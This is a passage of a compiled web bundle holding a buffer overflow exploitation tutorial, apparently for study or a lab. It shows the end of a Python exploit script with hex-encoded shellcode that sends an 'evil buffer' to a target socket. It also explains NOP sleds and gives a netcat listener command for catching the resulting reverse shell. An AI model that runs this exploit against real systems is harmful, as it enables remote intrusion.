8\\x55"\n"\\x5b\\xe8\\x84\\x2c\\x48\\xce\\x7c\\xec\\x06\\xf0\\x73\\x8c\\xcc\\xc5\\xe1"\n"\\x3d\\xa4\\x2f\\x6f\\x0e\\xf3\\xf1\\xbd\\xaf\\xce\\xb4\\xd5\\x0f\\x46\\x5b"\n"\\xea\\x9e\\xe0\\x82\\xb0\\x58\\xa5\\x2b\\xc8\\x7d\\xb4\\x60\\x8c\\x1d\\xf0"\n"\\xf6\\xda\\x0f\\xf2\\xe0\\xda\\x17\\xf2\\xf0\\xdf\\x0f\\xcc\\xdf\\x40\\x66"\n"\\x22\\x59\\x59\\xd0\\x44\\xe8\\xda\\x1f\\x5b\\x96\\xe4\\x51\\x23\\xbb\\xec"\n"\\xa6\\x71\\x1d\\x6c\\x44\\x8e\\xac\\xe4\\xff\\x31\\x1b\\x11\\xa6\\x71\\x9a"\n"\\x8a\\x25\\xae\\x26\\x77\\xb9\\xd1\\xa3\\x37\\x1e\\xb7\\xd4\\xe3\\x33\\xa4"\n"\\xf5\\x73\\x8c"\n)\npostfix = ""\n\nbuffer = overflow + retn + padding + shellcode + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Sending evil buffer...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,o.jsxs)(n.admonition,{title:"NOP Sled",type:"info",children:[(0,o.jsxs)(n.blockquote,{children:["\n",(0,o.jsx)(n.p,{children:"What is a NOP Sled and what does it do?"}),"\n"]}),(0,o.jsxs)(n.p,{children:["Brilliant ",(0,o.jsx)(n.a,{href:"https://stackoverflow.com/questions/14760587/how-does-a-nop-sled-work",children:"stackoverflow"})," answer:"]}),(0,o.jsx)(n.p,{children:'"Some attacks consist of making the program jump to a specific address and continue running from there. The injected code has to be loaded previously somehow in that exact location.'}),(0,o.jsx)(n.p,{children:"Stack randomization and other runtime differences may make the address where the program will jump impossible to predict, so the attacker places a NOP sled in a big range of memory. If the program jumps to anywhere into the sled, it will run all the remaining NOPs, doing nothing, and then will run the payload code, just next to the sled."}),(0,o.jsx)(n.p,{children:'The reason the attacker uses the NOP sled is to make the target address bigger: the code can jump anywhere in the sled, instead of exactly at the beginning of the injected code."'})]}),"\n",(0,o.jsx)(n.h3,{id:"listener--pop",children:"listener + pop"}),"\n",(0,o.jsxs)(n.p,{children:["On your attack machine, run a listener: ",(0,o.jsx)(n.code,{children:"rlwrap nc -lvnp 4444"})]}),"\n",(0,o.jsxs)(n.p,{children:["Run ",(0,o.jsx)(n.code,{children:"./payload.py"})," and if everything went correctly, you will have a shell pop in your listener."]}),"\n",(0,o.jsx)(n.h2,{id:"references",children:"References"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://www.notsoshant.io/blog/windows-exploitation-dealing-with-bad-characters-quickzip-exploit/",children:"Windows Exploitation: Dealing with bad characters\u200a\u2014\u200aQuickZip exploit"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://www.youtube.com/watch?v=ncBblM920jw",children:"Buffer Overflows Made Easy (2022 Edition)"})}),"\n"]})]})}function c(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>x});var s=t(96540);const o={},a=s.createContext(o);function r(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function x(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:r(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);